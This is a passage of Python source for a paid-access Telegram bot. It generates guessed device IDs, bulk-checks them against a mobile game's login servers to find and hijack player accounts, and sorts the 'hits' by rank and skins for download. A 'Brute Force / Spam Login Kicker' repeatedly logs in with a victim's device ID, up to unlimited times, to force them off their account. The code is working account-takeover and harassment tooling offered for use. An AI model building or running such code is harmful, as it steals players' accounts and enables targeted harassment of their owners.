            await query.edit_message_text(
                "📤 *Upload File for Bulk Check*\n\nPlease upload a `.txt` file containing device IDs.\n"
                "One device ID per line.\n\nThe file should be less than 10MB.\n\nOr type /cancel to go back.",
                parse_mode='Markdown'
            )
            context.user_data['state'] = AWAITING_FILE
        
        elif data == "bulk_generated":
            file_path = os.path.join(OUTPUT_DIR, FOLDERS["generated"], "generated_devices.txt")
            if not os.path.exists(file_path):
                await query.edit_message_text("❌ *No generated file found*\n\nPlease generate devices first.", parse_mode='Markdown')
                return
            
            with open(file_path, 'r') as f:
                devices = [line.strip() for line in f if line.strip()]
            
            if not devices:
                await query.edit_message_text("❌ *No devices found in file*", parse_mode='Markdown')
                return
            
            context.user_data['bulk_devices'] = devices
            await start_bulk_check(update, context, query)
        
        elif data == "menu_bruteforce":
            await query.edit_message_text(
                "⚡ *Brute Force / Spam Login Kicker*\n\n"
                "Please send me the Device ID to attack.\n"
                "Example: `and_abcd1234...`\n\n"
                "⚠️ Use responsibly!\n\n"
                "You can STOP the attack at any time using the STOP button.\n\n"
                "Or type /cancel to go back.",
                parse_mode='Markdown'
            )
            context.user_data['state'] = AWAITING_BRUTE_CONFIG
        
        elif data == "menu_stats":
            await show_statistics(update, context, query)
        
        elif data == "menu_keys":
            if is_admin(user_id):
                await show_key_management(update, context, query)
            else:
                await query.edit_message_text(
                    "🔑 *Your Access Status*\n\n✅ Authorized\n"
                    f"Key used: {context.user_data.get('used_key', 'Unknown')}\n\nContact admin for key management.",
                    parse_mode='Markdown'
                )
        
        elif data == "menu_help":
            await help_command(update, context)
        
        # ─── Brute Force Stop Handler ──────────────────────────
        elif data == "brute_stop":
            context.user_data['brute_running'] = False
            await query.edit_message_text(
                "🛑 *Brute Force Stopped!*\n\n"
                "The attack has been stopped by user request.\n\n"
                "Use /start to return to main menu.",
                parse_mode='Markdown'
            )
    
    except Exception as e:
        logger.error(f"Error in menu_callback: {e}")
        try:
            await update.callback_query.edit_message_text(
                f"❌ *Error:* {str(e)}",
                parse_mode='Markdown'
            )
        except:
            pass

# ─── Key Redemption ─────────────────────────────────────────────

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /redeem command"""
    try:
        user_id = update.effective_user.id
        
        if is_authorized(user_id):
            await safe_reply(update, "✅ *Already Authorized*\n\nYou already have active access.", parse_mode='Markdown')
            return
        
        args = context.args
        if not args:
            await safe_reply(
                update,
                "🔑 *Redeem Key*\n\nUsage: `/redeem <KEY>`\n\nExample: `/redeem DEVID_A1B2C3D4E5F6`",
                parse_mode='Markdown'
            )
            return
        
        key_str = args[0].strip().upper()
        key = key_manager.validate_key(key_str)
        
        if not key:
            await safe_reply(
                update,
                "❌ *Invalid Key*\n\nThe key you provided is invalid, expired, or already used up.\n"
                "Please contact an administrator for a new key.",
                parse_mode='Markdown'
            )
            return
        
        if not key_manager.use_key(key_str, user_id):
            await safe_reply(
                update,
                "❌ *Key Already Used*\n\nThis key has already been used or reached its limit.",
                parse_mode='Markdown'
            )
            return
        
        session_manager.authorize(user_id, key)
        context.user_data['used_key'] = key_str
        
        await safe_reply(
            update,
            f"✅ *Access Granted!*\n\nKey: `{key_str}`\nWelcome to Premium Devid Seker Bot!\n\nUse /start to begin.",
            parse_mode='Markdown'
        )
    
    except Exception as e:
        logger.error(f"Error in redeem_command: {e}")
        await safe_reply(update, f"❌ *Error:* {str(e)}", parse_mode='Markdown')

# ─── Status Command ────────────────────────────────────────────

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check user status"""
    try:
        user_id = update.effective_user.id
        
        if is_admin(user_id):
            status_text = "👑 *Admin Access*\n\nYou have full administrative access."
        elif is_authorized(user_id):
            status_text = (
                "✅ *Authorized*\n\n"
                f"Key: `{context.user_data.get('used_key', 'Unknown')}`\n"
                "Access expires: 24 hours from last use."
            )
        else:
            status_text = "❌ *Not Authorized*\n\nPlease use /redeem <KEY> to activate your access."
        
        await safe_reply(update, status_text, parse_mode='Markdown')
    
    except Exception as e:
        logger.error(f"Error in status_command: {e}")

# ─── Key Management ────────────────────────────────────────────

async def show_key_management(update: Update, context: ContextTypes.DEFAULT_TYPE, query=None):
    """Show key management menu"""
    keyboard = [
        [InlineKeyboardButton("📋 List All Keys", callback_data="keys_list")],
        [InlineKeyboardButton("🔑 Generate New Key", callback_data="keys_generate")],
        [InlineKeyboardButton("🗑️ Revoke Key", callback_data="keys_revoke")],
        [InlineKeyboardButton("📊 Key Statistics", callback_data="keys_stats")],
        [InlineKeyboardButton("🔙 Back", callback_data="menu_main")],
    ]
    
    msg = "🔑 *Key Management*\n\nManage access keys for the bot."
    
    try:
        if query:
            await query.edit_message_text(
                msg,
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode='Markdown'
            )
        else:
            await safe_reply(update, msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Error showing key management: {e}")

# ─── Key Callback Handler ──────────────────────────────────────

async def keys_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle key management callbacks"""
    try:
        query = update.callback_query
        await query.answer()
        
        user_id = update.effective_user.id
        if not is_admin(user_id):
            await query.edit_message_text(
                "❌ *Admin Only*\n\nThis feature is only available to administrators.",
                parse_mode='Markdown'
            )
            return
        
        data = query.data
        
        if data == "keys_generate":
            keyboard = [
                [InlineKeyboardButton("1 Day", callback_data="kg_1")],
                [InlineKeyboardButton("7 Days", callback_data="kg_7")],
                [InlineKeyboardButton("30 Days", callback_data="kg_30")],
                [InlineKeyboardButton("90 Days", callback_data="kg_90")],
                [InlineKeyboardButton("Custom", callback_data="kg_custom")],
                [InlineKeyboardButton("🔙 Back", callback_data="keys_back")],
            ]
            await query.edit_message_text(
                "🔑 *Generate New Key*\n\nSelect expiry period:",
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode='Markdown'
            )
        
        elif data.startswith("kg_"):
            expiry_map = {"1": 1, "7": 7, "30": 30, "90": 90}
            period = data.replace("kg_", "")
            if period == "custom":
                await query.edit_message_text(
                    "📝 *Custom Expiry*\n\nEnter number of days:",
                    parse_mode='Markdown'
                )
                context.user_data['state'] = KEY_MENU
                return
            
            days = expiry_map.get(period, 7)
            key_str = key_manager.generate_key(user_id, max_uses=10, expiry_days=days)
            
            if key_str:
                await query.edit_message_text(
                    f"✅ *Key Generated Successfully!*\n\n"
                    f"🔑 Key: `{key_str}`\n"
                    f"📅 Expires: {days} days\n"
                    f"🔄 Max uses: 10\n"
                    f"👤 Created by: {user_id}\n\n"
                    f"Share this key with users to grant access.\n"
                    f"User should use: `/redeem {key_str}`",
                    parse_mode='Markdown'
                )
            else:
                await query.edit_message_text(
                    "❌ *Failed to Generate Key*\n\nYou have reached the maximum number of active keys.",
                    parse_mode='Markdown'
                )
        
        elif data == "keys_list":
            keys = key_manager.list_keys(user_id)
            if not keys:
                await query.edit_message_text("📋 *No Keys Found*\n\nNo keys have been generated yet.", parse_mode='Markdown')
                return
            
            page = context.user_data.get('key_page', 0)
            page_size = 10
            total_pages = (len(keys) + page_size - 1) // page_size
            
            if page >= total_pages:
                page = 0
            
            start_idx = page * page_size
            end_idx = min(start_idx + page_size, len(keys))
            
            text = f"📋 *Keys (Page {page + 1}/{total_pages})*\n\n"
            for key in keys[start_idx:end_idx]:
                status = "✅" if key.can_use() else "❌"
                text += f"{status} `{key.key}`\n"
                text += f"   Uses: {key.used_count}/{key.max_uses}\n"
                text += f"   Expires: {key.expires_at[:10]}\n\n"
            
            keyboard = []
            row = []
            if page > 0:
                row.append(InlineKeyboardButton("◀️ Previous", callback_data="key_prev"))
            if page < total_pages - 1:
                row.append(InlineKeyboardButton("Next ▶️", callback_data="key_next"))
            row.append(InlineKeyboardButton("🔙 Back", callback_data="keys_back"))
            keyboard.append(row)
            
            context.user_data['key_page'] = page
            await query.edit_message_text(
                text,
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode='Markdown'
            )
        
        elif data == "key_prev":
            context.user_data['key_page'] = context.user_data.get('key_page', 0) - 1
            await keys_callback(update, context)
        
        elif data == "key_next":
            context.user_data['key_page'] = context.user_data.get('key_page', 0) + 1
            await keys_callback(update, context)
        
        elif data == "keys_revoke":
            await query.edit_message_text(
                "🗑️ *Revoke Key*\n\nSend me the key to revoke:\n"
                "Example: `DEVID_A1B2C3D4E5F6`\n\nType /cancel to cancel.",
                parse_mode='Markdown'
            )
            context.user_data['state'] = AWAITING_KEY
        
        elif data == "keys_stats":
            stats = key_manager.get_stats()
            text = (
                "📊 *Key Statistics*\n\n"
                f"📌 Total Keys: {stats['total']}\n"
                f"✅ Active Keys: {stats['active']}\n"
                f"⏰ Expired Keys: {stats['expired']}\n"
                f"🔒 Used Keys: {stats['used']}\n"
                f"🔄 Total Uses: {stats['total_uses']}\n"
            )
            keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="keys_back")]]
            await query.edit_message_text(
                text,
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode='Markdown'
            )
        
        elif data == "keys_back":
            await show_key_management(update, context, query)
    
    except Exception as e:
        logger.error(f"Error in keys_callback: {e}")

# ─── Statistics ────────────────────────────────────────────────

async def show_statistics(update: Update, context: ContextTypes.DEFAULT_TYPE, query=None):
    """Show bot statistics"""
    try:
        rank_counts = {}
        for rank in ['warrior', 'elite', 'master', 'gm', 'epic', 'legend', 'mythic']:
            rank_file = os.path.join(OUTPUT_DIR, FOLDERS[f"rank_{rank}"], f"{rank}_hits.txt")
            if os.path.exists(rank_file):
                with open(rank_file, 'r') as f:
                    rank_counts[rank] = sum(1 for _ in f)
            else:
                rank_counts[rank] = 0
        
        v2l_file = os.path.join(OUTPUT_DIR, FOLDERS["v2l_active"], "v2l_active.txt")
        v2l_active = 0
        if os.path.exists(v2l_file):
            with open(v2l_file, 'r') as f:
                v2l_active = sum(1 for _ in f)
        
        sultan_file = os.path.join(OUTPUT_DIR, FOLDERS["sultan"], "sultan.txt")
        sultan = 0
        if os.path.exists(sultan_file):
            with open(sultan_file, 'r') as f:
                sultan = sum(1 for _ in f)
        
        total = sum(rank_counts.values())
        
        text = (
            "📊 *Bot Statistics*\n\n"
            f"🏆 *Rank Distribution:*\n"
            f"  Warrior: {rank_counts.get('warrior', 0):,}\n"
            f"  Elite: {rank_counts.get('elite', 0):,}\n"
            f"  Master: {rank_counts.get('master', 0):,}\n"
            f"  Grandmaster: {rank_counts.get('gm', 0):,}\n"
            f"  Epic: {rank_counts.get('epic', 0):,}\n"
            f"  Legend: {rank_counts.get('legend', 0):,}\n"
            f"  Mythic: {rank_counts.get('mythic', 0):,}\n"
            f"\n📌 *Total Valid Accounts:* {total:,}\n"
            f"🟢 *V2L Active:* {v2l_active:,}\n"
            f"👑 *Sultan Accounts:* {sultan:,}\n"
        )
        
        if query:
            await query.edit_message_text(text, parse_mode='Markdown')
        else:
            await safe_reply(update, text, parse_mode='Markdown')
    
    except Exception as e:
        logger.error(f"Error in show_statistics: {e}")

# ─── Bulk Check ────────────────────────────────────────────────

async def start_bulk_check(update: Update, context: ContextTypes.DEFAULT_TYPE, query=None):
    """Start bulk check process"""
    devices = context.user_data.get('bulk_devices', [])
    if not devices:
        await query.edit_message_text("❌ *No devices found*", parse_mode='Markdown')
        return
    
    total = len(devices)
    keyboard = [
        [InlineKeyboardButton("▶️ Start Check", callback_data="bulk_start")],
        [InlineKeyboardButton("🔙 Back", callback_data="menu_main")],
    ]
    
    text = (
        f"📊 *Bulk Check Ready*\n\n"
        f"📌 Devices to check: {total:,}\n"
        f"⚡ Threads: 50\n\n"
        f"⚠️ This may take several minutes.\n"
        f"Results will be automatically saved to folders.\n\n"
        f"Click 'Start Check' to begin."
    )
    
    try:
        if query:
            await query.edit_message_text(
                text,
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode='Markdown'
            )
        else:
            await safe_reply(update, text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Error in start_bulk_check: {e}")

async def start_bulk_check_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle bulk check start callback"""
    try:
        query = update.callback_query
        await query.answer()
        
        devices = context.user_data.get('bulk_devices', [])
        if not devices:
            await query.edit_message_text("❌ *No devices to check*", parse_mode='Markdown')
            return
        
        await query.edit_message_text(
            "⏳ *Starting bulk check...*\n"
            f"📌 Total: {len(devices):,} devices\n\n"
            "Results will be shown as they're found.",
            parse_mode='Markdown'
        )
        
        context.user_data['bulk_running'] = True
        
        chunk_size = 50
        processed = 0
        found = 0
        
        status_msg = await query.message.edit_text(
            f"⏳ *Processing...*\n"
            f"📌 Progress: 0/{len(devices)} devices\n"
            f"✅ Found: 0 accounts",
            parse_mode='Markdown'
        )
        
        for i in range(0, len(devices), chunk_size):
            if not context.user_data.get('bulk_running', True):
                break
            
            chunk = devices[i:i+chunk_size]
            for device in chunk:
                result = process_device_check(device)
                processed += 1
                if result['success']:
                    found += 1
                    save_check_result(result)
                
                if processed % 10 == 0:
                    try:
                        await status_msg.edit_text(
                            f"⏳ *Processing...*\n"
                            f"📌 Progress: {processed}/{len(devices)} devices\n"
                            f"✅ Found: {found} accounts\n"
                            f"🎯 Rate: {found/processed*100:.1f}%",
                            parse_mode='Markdown'
                        )
                    except Exception as e:
                        logger.error(f"Error updating status: {e}")
        
        context.user_data['bulk_running'] = False
        
        keyboard = [
            [InlineKeyboardButton("📥 Download Results", callback_data="download_bulk")],
            [InlineKeyboardButton("🔙 Main Menu", callback_data="menu_main")],
        ]
        
        await status_msg.edit_text(
            f"✅ *Bulk Check Complete!*\n\n"
            f"📊 Processed: {processed:,} devices\n"
            f"✅ Found: {found:,} valid accounts\n"
            f"🎯 Success Rate: {found/processed*100:.1f}%\n\n"
            f"Results saved to output folders.",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    
    except Exception as e:
        logger.error(f"Error in start_bulk_check_callback: {e}")

async def download_bulk_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle bulk results download"""
    try:
        query = update.callback_query
        await query.answer()
        
        import zipfile
        from io import BytesIO
        
        zip_buffer = BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            detail_file = os.path.join(OUTPUT_DIR, FOLDERS["detail"], "all_hits_detail.txt")
            if os.path.exists(detail_file):
                zip_file.write(detail_file, "all_hits_detail.txt")
            
            raw_file = os.path.join(OUTPUT_DIR, FOLDERS["detail"], "raw_devices_detail.txt")
            if os.path.exists(raw_file):
                zip_file.write(raw_file, "raw_devices_detail.txt")
            
            for rank in ['warrior', 'elite', 'master', 'gm', 'epic', 'legend', 'mythic']:
                rank_file = os.path.join(OUTPUT_DIR, FOLDERS[f"rank_{rank}"], f"{rank}_hits.txt")
                if os.path.exists(rank_file):
                    zip_file.write(rank_file, f"rank_{rank}.txt")
        
        zip_buffer.seek(0)
        await query.message.reply_document(
            document=InputFile(zip_buffer, filename="bulk_results.zip"),
            caption="📊 Bulk Check Results"
        )
    
    except Exception as e:
        logger.error(f"Error in download_bulk_callback: {e}")

# ─── Device Generation ─────────────────────────────────────────

def generate_devices(count: int, output_file: str):
    """Generate device IDs"""
    REAL_OEM_HASHES = [
        "cd9e459ea708a948d5c2f5a6ca8838cf", 
        "b7f9a1c2d3e4f5061728394a5b6c7d8e",
        "a1c8f304e792b516d8e0349acb1527fe", 
    ]
    
    def random_hex(n: int) -> str:
        return ''.join(random.choices(HEX_CHARS, k=n))
    
    generators = [
        lambda: f"and_{random_hex(32)}{random_hex(16)}{uuid.uuid4()}\n",
        lambda: f"and_{random.choice(REAL_OEM_HASHES)}{random_hex(16)}{uuid.uuid4()}\n",
        lambda: f"and_{random.choice(REAL_OEM_HASHES)}-{uuid.uuid4()}\n",
        lambda: f"and_{random_hex(32)}-{uuid.uuid4()}\n",
        lambda: f"ios_{str(uuid.uuid4()).upper()}\n",
    ]
    
    with open(output_file, 'w', encoding='utf-8') as f:
        for i in range(count):
            f.write(random.choice(generators)())
            if i % 1000 == 0:
                f.flush()

# ─── Save Results ──────────────────────────────────────────────

def save_check_result(result: Dict):
    """Save check result to output files"""
    try:
        device = result['device_id']
        acc = result['account_id']
        zone = result['zone_id']
        
        rank_text = result['rank'] or 'Unranked'
        rank_category = "other"
        if rank_text:
            rt = rank_text.lower()
            if "mythic" in rt or "immortal" in rt or "glory" in rt:
                rank_category = "mythic"
            elif "legend" in rt:
                rank_category = "legend"
            elif "epic" in rt:
                rank_category = "epic"
            elif "grandmaster" in rt:
                rank_category = "gm"
            elif "master" in rt:
                rank_category = "master"
            elif "elite" in rt:
                rank_category = "elite"
            elif "warrior" in rt:
                rank_category = "warrior"
        
        card = (
            f"Device ID    : {device}\n"
            f"Account      : {acc} ({zone})\n"
            f"Nickname     : {result['nickname']} (Lv.{result['level']})\n"
            f"Status       : NORMAL\n"
            f"Rank         : {result['rank']}\n"
            f"Max Rank     : {result['highest_rank']}\n"
            f"Heroes       : {result['hero_count']}\n"
            f"Skins        : {result['skin_count']}\n"
            f"V2L Status   : {result['v2l_status']}\n"
            f"Created      : {result['created_at'] or 'N/A'}\n"
            f"{'='*60}\n"
        )
        
        detail_file = os.path.join(OUTPUT_DIR, FOLDERS["detail"], "all_hits_detail.txt")
        with open(detail_file, 'a', encoding='utf-8') as f:
            f.write(card)
        
        raw_file = os.path.join(OUTPUT_DIR, FOLDERS["detail"], "raw_devices_detail.txt")
        with open(raw_file, 'a', encoding='utf-8') as f:
            f.write(f"{device}\n")
        
        if rank_category != "other":
            rank_folder = os.path.join(OUTPUT_DIR, FOLDERS[f"rank_{rank_category}"])
            os.makedirs(rank_folder, exist_ok=True)
            rank_file = os.path.join(rank_folder, f"{rank_category}_hits.txt")
            with open(rank_file, 'a', encoding='utf-8') as f:
                f.write(card)
        
        v2l_status = str(result['v2l_status']).lower()
        if v2l_status in ['enabled', 'yes', '1', 'true']:
            v2l_file = os.path.join(OUTPUT_DIR, FOLDERS["v2l_active"], "v2l_active.txt")
            with open(v2l_file, 'a', encoding='utf-8') as f:
                f.write(card)
    
    except Exception as e:
        logger.error(f"Error saving result: {e}")

# ─── Message Handler ───────────────────────────────────────────

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle incoming messages"""
    try:
        user_id = update.effective_user.id
        state = context.user_data.get('state')
        
        if not is_authorized(user_id):
            await safe_reply(
                update,
                "🔒 *Access Denied*\n\nPlease use /redeem <KEY> to activate your access.",
                parse_mode='Markdown'
            )
            return
        
        if state == AWAITING_DEVICE:
            await handle_device_input(update, context)
        
        elif state == AWAITING_FILE:
            await handle_file_upload(update, context)
        
        elif state == GENERATOR_MENU:
            try:
                size = float(update.message.text.strip())
                if size <= 0:
                    raise ValueError
                context.user_data['state'] = None
                await safe_reply(
                    update,
                    f"⏳ *Generating {size}MB of Device IDs...*",
                    parse_mode='Markdown'
                )
                output_file = os.path.join(OUTPUT_DIR, FOLDERS["generated"], "generated_devices.txt")
                if os.path.exists(output_file):
                    os.remove(output_file)
                count = int((size * 1024 * 1024) / 80 * 1.02)
                generate_devices(count, output_file)
                
                if os.path.exists(output_file):
                    with open(output_file, 'r') as f:
                        line_count = sum(1 for _ in f)
                    await safe_reply(
                        update,
                        f"✅ *Generation Complete!*\n\n📊 Generated: {line_count:,} devices\n"
                        f"📦 File size: ~{size}MB\n\nUse /start to continue.",
                        parse_mode='Markdown'
                    )
                else:
                    await safe_reply(update, "❌ *Generation Failed*", parse_mode='Markdown')
            except:
                await safe_reply(
                    update,
                    "❌ *Invalid size*\n\nPlease enter a valid number (e.g., 100)",
                    parse_mode='Markdown'
                )
        
        elif state == AWAITING_KEY:
            key_str = update.message.text.strip().upper()
            if key_manager.revoke_key(key_str, user_id):
                await safe_reply(
                    update,
                    f"✅ *Key Revoked*\n\nKey: `{key_str}`\nSuccessfully revoked.",
                    parse_mode='Markdown'
                )
            else:
                await safe_reply(
                    update,
                    f"❌ *Key not found*\n\nKey: `{key_str}`\nPlease check the key and try again.",
                    parse_mode='Markdown'
                )
            context.user_data['state'] = None
            await show_key_management(update, context)
        
        elif state == AWAITING_BRUTE_CONFIG:
            await handle_brute_config(update, context)
        
        else:
            await safe_reply(
                update,
                "❓ *Unknown command*\n\nUse /start to see the main menu.",
                parse_mode='Markdown'
            )
    
    except Exception as e:
        logger.error(f"Error in handle_message: {e}")

# ─── Device Input Handler ──────────────────────────────────────

async def handle_device_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle device ID input for single check"""
    try:
        device_id = update.message.text.strip()
        
        if device_id.lower() in ['/cancel', 'cancel']:
            context.user_data['state'] = None
            await show_main_menu(update, context)
            return
        
        if not device_id.startswith(('and_', 'ios_')):
            await safe_reply(
                update,
                "❌ *Invalid Device ID*\n\nDevice ID must start with 'and_' or 'ios_'.\n"
                "Please try again or type /cancel.",
                parse_mode='Markdown'
            )
            return
        
        msg = await update.message.reply_text(
            "⏳ *Checking device...*\nThis may take 10-20 seconds.",
            parse_mode='Markdown'
        )
        
        result = process_device_check(device_id)
        
        if result['success']:
            rank_emoji = "🏆"
            if "Mythic" in str(result['rank']):
                rank_emoji = "👑"
            elif "Legend" in str(result['rank']):
                rank_emoji = "⭐"
            
            v2l_emoji = "🟢" if str(result['v2l_status']).lower() in ['enabled', 'yes', '1', 'true'] else "🔴"
            
            text = (
                f"✅ *Account Found!*\n\n"
                f"📱 Device: `{device_id[:30]}...`\n"
                f"🆔 Account: `{result['account_id']}` ({result['zone_id']})\n"
                f"👤 Nickname: *{result['nickname']}* (Lv.{result['level']})\n"
                f"{rank_emoji} Rank: *{result['rank']}*\n"
                f"🌟 Highest: {result['highest_rank']}\n"
                f"🎨 Skins: {result['skin_count']}  |  🦸 Heroes: {result['hero_count']}\n"
                f"🔐 V2L: {v2l_emoji} {result['v2l_status']}\n"
                f"📅 Created: {result['created_at'] or 'N/A'}\n"
                f"⚡ Status: *{'✅ NORMAL' if 'ban' not in str(result['ban_status']).lower() else '⚠️ BANNED'}*\n\n"
                f"👑 *Premium Devid Seker*\nCreated by: @ZyronDevv"
            )
            
            await msg.edit_text(text, parse_mode='Markdown')
            save_check_result(result)
            await show_main_menu(update, context)
            
        else:
            error_msg = result.get('error', 'Unknown error')
            await msg.edit_text(
                f"❌ *Check Failed*\n\nDevice: `{device_id}`\nError: {error_msg}\n\n"
                f"Please try again with a different device.",
                parse_mode='Markdown'
            )
    
    except Exception as e:
        logger.error(f"Error in handle_device_input: {e}")

# ─── File Upload Handler ──────────────────────────────────────

async def handle_file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle uploaded file for bulk check"""
    try:
        document = update.message.document
        
        if not document:
            await safe_reply(update, "❌ *No file found*\n\nPlease upload a `.txt` file.", parse_mode='Markdown')
            return
        
        if document.file_size > 10 * 1024 * 1024:
            await safe_reply(update, "❌ *File too large*\n\nFile must be less than 10MB.", parse_mode='Markdown')
            return
        
        msg = await update.message.reply_text("⏳ *Downloading file...*", parse_mode='Markdown')
        
        file = await document.get_file()
        file_path = os.path.join(OUTPUT_DIR, "uploaded_devices.txt")
        await file.download_to_drive(file_path)
        
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            devices = [line.strip() for line in f if line.strip()]
        
        if not devices:
            await msg.edit_text("❌ *Empty file*\n\nNo device IDs found in the file.", parse_mode='Markdown')
            return
        
        context.user_data['bulk_devices'] = devices
        await start_bulk_check(update, context, msg)
        
    except Exception as e:
        logger.error(f"Error in handle_file_upload: {e}")
        await safe_reply(update, f"❌ *Error:* {str(e)}", parse_mode='Markdown')

# ─── Brute Force Handler ──────────────────────────────────────

async def handle_brute_config(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle brute force device input"""
    try:
        device_id = update.message.text.strip()
        
        if device_id.lower() in ['/cancel', 'cancel']:
            context.user_data['state'] = None
            await show_main_menu(update, context)
            return
        
        if not device_id.startswith(('and_', 'ios_')):
            await safe_reply(
                update,
                "❌ *Invalid Device ID*\n\nDevice ID must start with 'and_' or 'ios_'.\n"
                "Please try again or type /cancel.",
                parse_mode='Markdown'
            )
            return
        
        msg = await update.message.reply_text("⏳ *Verifying device...*", parse_mode='Markdown')
        
        result = process_device_check(device_id)
        if not result['success']:
            await msg.edit_text(
                f"❌ *Invalid device or login failed*\n\nError: {result.get('error', 'Unknown')}",
                parse_mode='Markdown'
            )
            return
        
        context.user_data['brute_device'] = device_id
        context.user_data['brute_account'] = result
        context.user_data['brute_running'] = False  # Reset stop flag
        
        keyboard = [
            [InlineKeyboardButton("🧪 Single Test", callback_data="brute_1")],
            [InlineKeyboardButton("⚡ 10x Kicks", callback_data="brute_10")],
            [InlineKeyboardButton("🚀 50x Kicks", callback_data="brute_50")],
            [InlineKeyboardButton("💥 100x Kicks", callback_data="brute_100")],
            [InlineKeyboardButton("♾️ Unlimited", callback_data="brute_unlimited")],
            [InlineKeyboardButton("🔙 Back", callback_data="menu_main")],
        ]
        
        await msg.edit_text(
            f"⚡ *Brute Force Setup*\n\nTarget: *{result['nickname']}*\n"
            f"Account: `{result['account_id']}` ({result['zone_id']})\n"
            f"Rank: {result['rank']}\n\nSelect attack intensity:",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    
    except Exception as e:
        logger.error(f"Error in handle_brute_config: {e}")

async def brute_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle brute force callbacks"""
    try:
        query = update.callback_query
        await query.answer()
        
        data = query.data
        account = context.user_data.get('brute_account')
        
        if not account:
            await query.edit_message_text(
                "❌ *No target set*\n\nPlease set a target first.",
                parse_mode='Markdown'
            )
            return
        
        brute_configs = {
            "brute_1": (1, 0),
            "brute_10": (10, 2),
            "brute_50": (50, 1),
            "brute_100": (100, 0.5),
            "brute_unlimited": (0, 0.5),
        }
        
        config = brute_configs.get(data)
        if not config:
            return
        
        loops, delay = config
        
        # Set running flag
        context.user_data['brute_running'] = True
        
        await query.edit_message_text(
            f"⚡ *Starting Brute Force*\n\nTarget: *{account['nickname']}*\n"
            f"Loops: {'∞' if loops == 0 else loops}\nDelay: {delay}s\n\n"
            f"⏳ Starting...\n\n"
            f"Press the STOP button below to cancel anytime.",
            parse_mode='Markdown'
        )
        
        await run_brute_force(update, context, query, account, loops, delay)
    
    except Exception as e:
        logger.error(f"Error in brute_callback: {e}")

async def run_brute_force(update, context, query, account, loops, delay):
    """Execute brute force attack with stop button"""
    try:
        device_id = context.user_data.get('brute_device')
        if not device_id:
            return
        
        success_count = 0
        fail_count = 0
        count = 0
        start_time = time.time()
        
        # Create keyboard with STOP button
        keyboard = [[InlineKeyboardButton("🛑 STOP BRUTE FORCE", callback_data="brute_stop")]]
        
        status_msg = await query.message.edit_text(
            f"⚡ *Brute Force Running*\n\nTarget: *{account['nickname']}*\n"
            f"Progress: 0/{'∞' if loops == 0 else loops}\n"
            f"✅ Success: 0\n❌ Failed: 0\n⏱️ Elapsed: 0s\n\n"
            f"🛑 Press STOP to cancel",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
        
        def send_kick(device, acc_info):
            try:
                with GameConnection(device_id=device) as conn:
                    if conn.login_to_login_server():
                        if conn.get_game_server():
                            if conn.connect_to_game_server():
                                return True
                return False
            except:
                return False
        
        try:
            while True:
                # Check if user requested stop
                if not context.user_data.get('brute_running', True):
                    await status_msg.edit_text(
                        f"🛑 *Brute Force Stopped by User*\n\n"
                        f"Target: *{account['nickname']}*\n"
                        f"📊 Total Attempts: {count}\n"
                        f"✅ Success: {success_count}\n"
                        f"❌ Failed: {fail_count}\n"
                        f"🎯 Success Rate: {success_count/count*100:.1f}%\n"
                        f"⏱️ Duration: {time.time() - start_time:.1f}s\n\n"
                        f"Use /start to continue.",
                        parse_mode='Markdown'
                    )
                    return
                
                count += 1
                success = send_kick(device_id, account)
                
                if success:
                    success_count += 1
                else:
                    fail_count += 1
                
                # Update status every 5 kicks
                if count % 5 == 0:
                    elapsed = time.time() - start_time
                    try:
                        await status_msg.edit_text(
                            f"⚡ *Brute Force Running*\n\nTarget: *{account['nickname']}*\n"
                            f"Progress: {count}/{'∞' if loops == 0 else loops}\n"
                            f"✅ Success: {success_count}\n❌ Failed: {fail_count}\n"
                            f"🎯 Rate: {success_count/count*100:.1f}%\n"
                            f"⏱️ Elapsed: {elapsed:.0f}s\n\n"
                            f"🛑 Press STOP to cancel",
                            reply_markup=InlineKeyboardMarkup(keyboard),
                            parse_mode='Markdown'
                        )
                    except Exception as e:
                        logger.error(f"Error updating status: {e}")
                
                if loops > 0 and count >= loops:
                    break
                
                if delay > 0:
                    time.sleep(delay)
                    
        except Exception as e:
            logger.error(f"Brute force loop error: {e}")
        
        # Show completion summary
        elapsed = time.time() - start_time
        final_keyboard = [[InlineKeyboardButton("🔙 Main Menu", callback_data="menu_main")]]
        
        await status_msg.edit_text(
            f"✅ *Brute Force Complete!*\n\nTarget: *{account['nickname']}*\n"
            f"📊 Total Attempts: {count}\n✅ Success: {success_count}\n"
            f"❌ Failed: {fail_count}\n🎯 Success Rate: {success_count/count*100:.1f}%\n"
            f"⏱️ Duration: {elapsed:.1f}s\n⚡ Speed: {count/elapsed:.1f} kicks/s",
            reply_markup=InlineKeyboardMarkup(final_keyboard),
            parse_mode='Markdown'
        )
        
        # Reset running flag
        context.user_data['brute_running'] = False
    
    except Exception as e:
        logger.error(f"Error in run_brute_force: {e}")

# ─── Cancel Command ────────────────────────────────────────────

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /cancel command"""
    try:
        context.user_data['state'] = None
        context.user_data['bulk_running'] = False
        context.user_data['brute_running'] = False
